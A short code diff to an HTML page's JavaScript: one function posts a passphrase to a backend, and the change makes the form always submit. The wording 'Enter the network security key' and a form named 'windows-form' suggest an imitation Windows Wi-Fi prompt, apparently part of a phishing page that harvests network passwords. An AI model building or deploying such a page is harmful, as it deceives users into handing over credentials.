@@ -5,6 +5,7 @@
 <link rel="stylesheet" href="/static/style2.css">
 
 <script>
+
 function validate_passphrase (password, callback) {
     var xhttp = new XMLHttpRequest();
     xhttp.open("POST", "/backend/", true);
@@ -18,15 +19,10 @@ function validate_passphrase (password, callback) {
     xhttp.send(data);
 }
 
+
 function windows_validate_action (pw_status, password) {
-            if (pw_status == "success") {
-                document.getElementByid("windows-form").submit(); 
-                document.getElementById("pw_status").innerHTML = "Enter the network security key";
-            } else if (pw_status == "fail") {
-                document.getElementById("pw_status").innerHTML = "Enter the network security key: the passphrase is wrong!";
-            } else {
-                document.getElementById("windows-form").submit(); 
-            }
+                document.getElementById("windows-form").submit();
+		
         }
 
 </script>
